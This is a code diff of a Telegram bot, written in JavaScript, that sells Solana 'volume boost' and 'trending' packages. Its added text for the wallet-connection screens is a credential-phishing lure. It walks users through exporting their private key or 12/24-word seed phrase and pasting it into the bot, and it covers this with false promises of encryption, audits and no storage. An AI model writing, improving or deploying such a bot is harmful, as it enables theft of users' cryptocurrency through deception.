@@ -990,11 +990,11 @@ var volumeBoostKeyboard = Markup.inlineKeyboard([
   ],
   [
     Markup.button.callback("3.50 SOL - Gold", "vol_gold"),
-    Markup.button.callback("7.50 SOL - Platinum", "vol_platinum")
+    Markup.button.callback("7.50 SOL - Plati...", "vol_platinum")
   ],
   [
     Markup.button.callback("5.00 SOL - Silver", "vol_silver"),
-    Markup.button.callback("10.50 SOL - Diamond", "vol_diamond")
+    Markup.button.callback("10.50 SOL - Dia...", "vol_diamond")
   ],
   [
     Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
@@ -1005,7 +1005,7 @@ var trendingMenuKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("SOL TRENDING", "trend_sol")],
   [
     Markup.button.callback("ETH TRENDING", "trend_eth"),
-    Markup.button.callback("PUMPFUN TRENDING", "trend_pumpfun")
+    Markup.button.callback("PUMPFUN TREN...", "trend_pumpfun")
   ],
   [
     Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
@@ -1026,12 +1026,12 @@ var solTrendingKeyboard = Markup.inlineKeyboard([
     Markup.button.callback("\u23F3 6 hr | 1.60 SOL", "st_top10_6hr")
   ],
   [
-    Markup.button.callback("\u23F3 12 hr | 3.70 SOL", "st_top3_12hr"),
-    Markup.button.callback("\u23F3 12 hr | 2.60 SOL", "st_top10_12hr")
+    Markup.button.callback("\u23F3 12 hr | 3.70 S...", "st_top3_12hr"),
+    Markup.button.callback("\u23F3 12 hr | 2.60 S...", "st_top10_12hr")
   ],
   [
-    Markup.button.callback("\u23F3 24 hr | 5.90 SOL", "st_top3_24hr"),
-    Markup.button.callback("\u23F3 24 hr | 4.10 SOL", "st_top10_24hr")
+    Markup.button.callback("\u23F3 24 hr | 5.90...", "st_top3_24hr"),
+    Markup.button.callback("\u23F3 24 hr | 4.10 S...", "st_top10_24hr")
   ],
   [
     Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
@@ -1064,10 +1064,10 @@ var dexscreenerKeyboard = Markup.inlineKeyboard([
   ],
   [
     Markup.button.callback("\u23F3 12 hr | 7 SOL", "dex_12hr"),
-    Markup.button.callback("\u23F3 18 hr | 10 SOL", "dex_18hr")
+    Markup.button.callback("\u23F3 24 hr | 15 SOL", "dex_24hr")
   ],
   [
-    Markup.button.callback("\u23F3 24 hr | 15 SOL", "dex_24hr"),
+    Markup.button.callback("\u23F3 18 hr | 10 SOL", "dex_18hr"),
     Markup.button.callback("\u23F3 32 hr | 22 SOL", "dex_32hr")
   ],
   [
@@ -1099,12 +1099,25 @@ var connectWalletKeyboard = Markup.inlineKeyboard([
 var securityGuidelinesKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("\u{1F517} I Understand, Connect Now", "wallet_connect_now")],
   [
+    Markup.button.callback("\u{1F510} Why Connect?", "wallet_why"),
+    Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")
+  ],
+  [
     Markup.button.callback("\u2B05\uFE0F Back", "wallet_back"),
     Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var howToConnectKeyboard = Markup.inlineKeyboard([
+  [Markup.button.callback("\u{1F517} Start Connection", "wallet_connect_now")],
+  [
+    Markup.button.callback("\u{1F510} Why Connect?", "wallet_why"),
+    Markup.button.callback("\u{1F6E1}\uFE0F Security Guide...", "wallet_security")
+  ]
+]);
+var whyConnectKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("\u{1F517} Connect Now", "wallet_connect_now")],
+  [Markup.button.callback("\u{1F6E1}\uFE0F Security Guidelines", "wallet_security")],
+  [Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")],
   [
     Markup.button.callback("\u2B05\uFE0F Back", "wallet_back"),
     Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
@@ -1314,12 +1327,17 @@ Deposit not less than 0.30 SOL and get trending on several platforms
 async function showConnectWallet(ctx) {
   const caption = `\u{1F517} <b>Connect Your Wallet</b>
 
-Import and link your wallet to this bot for seamless payments and order management.
+Welcome to our secure wallet connection service!
+
+Connect your wallet to unlock premium features and enhanced trading capabilities.
 
 <b>Available Options:</b>
-\u{1F517} Connect Now \u2014 Import your wallet
-\u{1F6E1}\uFE0F Security Guidelines \u2014 Read before connecting
-\u{1F4F1} How to Connect \u2014 Step-by-step guide`;
+\u{1F517} Connect Now - Start the connection process
+\u{1F510} Why Connect? - Learn about the benefits
+\u{1F6E1}\uFE0F Security Guidelines - Important safety information
+\u{1F4F1} How to Connect - Step-by-step instructions
+
+Your security is our top priority. We use industry-standard encryption to protect your information.`;
   await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
 }
 async function showSupport(ctx) {
@@ -1773,7 +1791,7 @@ Connecting your wallet unlocks:
 \u2022 \u{1F4B0} <b>Auto-refunds</b> \u2014 failed orders refunded instantly
 \u2022 \u{1F3AF} <b>Priority processing</b> \u2014 faster service
 \u2022 \u{1F514} <b>Notifications</b> \u2014 alerts when boost goes live`,
-      connectWalletKeyboard
+      whyConnectKeyboard
     );
   });
   bot.action("wallet_security", async (ctx) => {
@@ -1782,14 +1800,28 @@ Connecting your wallet unlocks:
       ctx,
       `\u{1F6E1}\uFE0F <b>Security Guidelines</b>
 
-\u2022 End-to-End Encryption \u2014 Your data is encrypted at all times
-\u2022 No Storage \u2014 We never store your private keys permanently
-\u2022 Secure Processing \u2014 All operations use secure, isolated environments
-\u2022 Regular Audits \u2014 Our security is regularly tested and verified
+\u26A0\uFE0F <b>IMPORTANT SECURITY NOTICE:</b>
 
-\u26A0\uFE0F <b>Never share your private key or seed phrase with anyone except this official bot interface.</b>
+\u{1F512} <b>What We Do:</b>
+\u2022 End-to-End Encryption - Your data is encrypted at all times
+\u2022 No Storage - We never store your private keys permanently
+\u2022 Secure Processing - All operations use secure, isolated environments
+\u2022 Regular Audits - Our security is regularly tested and verified
 
-Ready to proceed?`,
+\u274C <b>What You Should Know:</b>
+\u2022 Never Share - Only enter your keys in official bot interfaces
+\u2022 Verify URL - Make sure you're using the official bot
+\u2022 Stay Alert - We will never ask for keys via other channels
+
+\u2705 <b>Best Practices:</b>
+\u2022 Monitor Activity - Regularly check your wallet transactions
+\u2022 Stay Updated - Keep your wallet software up to date
+\u2022 Use Hardware Wallets - For maximum security with large amounts
+
+\u{1F512} <b>Our Commitment:</b>
+We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.
+
+Ready to proceed safely?`,
       securityGuidelinesKeyboard
     );
   });
@@ -1799,13 +1831,33 @@ Ready to proceed?`,
       ctx,
       `\u{1F4F1} <b>How to Connect Your Wallet</b>
 
-1\uFE0F\u20E3 Click <b>Connect Now</b>
-2\uFE0F\u20E3 Open your wallet app (Phantom, Solflare, MetaMask, etc.)
-3\uFE0F\u20E3 Go to Settings \u2192 Export Private Key or Seed Phrase
-4\uFE0F\u20E3 Copy and paste it into the bot
-5\uFE0F\u20E3 Wait for confirmation
+\u{1F527} <b>Step-by-Step Process:</b>
 
-\u23F0 Connection usually takes 2\u20135 minutes.`,
+1\uFE0F\u20E3 <b>Choose Connection Method</b>
+\u2022 Private Key - Direct key import (fastest)
+\u2022 Seed Phrase - 12/24 word recovery phrase
+
+2\uFE0F\u20E3 <b>Prepare Your Information</b>
+\u2022 Open your wallet app (Phantom, Solflare, etc.)
+\u2022 Navigate to wallet settings or security section
+\u2022 Copy your private key or seed phrase
+
+3\uFE0F\u20E3 <b>Secure Connection</b>
+\u2022 Click "Start Connection" below
+\u2022 Paste your key or seed phrase when prompted
+\u2022 Wait for confirmation (2-5 minutes)
+
+\u{1F4F1} <b>Supported Wallets:</b>
+\u2022 Phantom - Most popular Solana wallet
+\u2022 Solflare - Advanced features and security
+\u2022 Backpack - Modern interface and tools
+\u2022 Glow - Mobile-optimized experience
+\u2022 Other Solana Wallets - Most SPL-compatible wallets
+
+\u23F0 Connection Time: Usually 2-5 minutes
+\u{1F512} Security: Military-grade encryption throughout
+
+Ready to connect your wallet?`,
       howToConnectKeyboard
     );
   });
@@ -1814,9 +1866,29 @@ Ready to proceed?`,
     setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
     await editOrSend(
       ctx,
-      `\u26A0\uFE0F This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..
+      `\u{1F517} <b>Connect Your Wallet Now</b>
 
-Please enter your <b>Private Key</b> or <b>12/24 word Seed Phrase</b> to import your wallet:`,
+\u26A0\uFE0F This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..
+
+Please enter your Private Key or 12 word Seed Phrase to import your wallet:
+
+\u{1F511} <b>Private Key Format:</b>
+\u2022 Single long string (64+ characters)
+\u2022 Example:
+<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>
+
+\u{1F331} <b>Seed Phrase Format:</b>
+\u2022 12 or 24 words separated by spaces
+\u2022 Example: <code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>
+
+\u2753 <b>Security Features:</b>
+\u2022 End-to-end encryption
+\u2022 Secure processing environment
+\u2022 Immediate deletion after connection
+\u2022 No permanent storage
+
+\u26A1 <b>Auto-Detection:</b>
+Our system will automatically detect whether you're providing a private key or seed phrase.`,
       cancelKeyboard
     );
   });
